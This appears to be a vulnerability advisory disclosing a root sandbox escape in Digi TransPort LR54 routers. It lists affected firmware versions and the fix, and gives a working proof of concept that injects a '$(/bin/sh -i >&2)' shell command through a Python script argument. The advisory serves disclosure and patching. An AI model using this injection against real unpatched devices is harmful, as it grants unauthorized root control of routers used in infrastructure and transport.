===========================================================

The Digi TransPort LR54 is a high speed LTE router commonly used by industry,
infrastructure, retail and public transportation.

It supports running python scripts in a restricted sandbox, and has a custom
shell accessible over SSH which is subjected to the same restrictions. The
underlying OS is inaccessible to the administrator.

Iave found a way to break out of the sandbox and obtaining a root shell by
exploiting the way the cli handles command line arguments when executing python
scripts:

When an interactive python process receives a SIGINT (trough CTRL-C), arguments
to the script are not properly escaped when passed to the interactive CLIas
error logging handler. This allows an attacker to execute arbitrary commands as
root.

To exploit this vulnerability, an attacker needs to have interactive CLI access
with asupera privileges. A user with this access level is enabled by default on
the device.

Vulnerable
- ----------
Digi Transport LR54 (and maybe related products like WR64 and WR54)

Firmware Version : 4.4.0.26 10/29/2018 21:14:06
Firmware Version : 4.3.2.24 09/06/2018 00:58:34

And maybe earlier versions

Migitation
- ----------
Users should upgrade to firmware version 4.5.1.4 or newer.

Proof of Concept
- ----------------
1. Upload sleep.py to the LR54 using scp or sftp, containing:

    import time;time.sleep(10)

2. Execute the following command in the LR54 cli:

    python sleep.py --XXX $(/bin/sh -i >&2)


4. You are then dropped to an interactive root shel
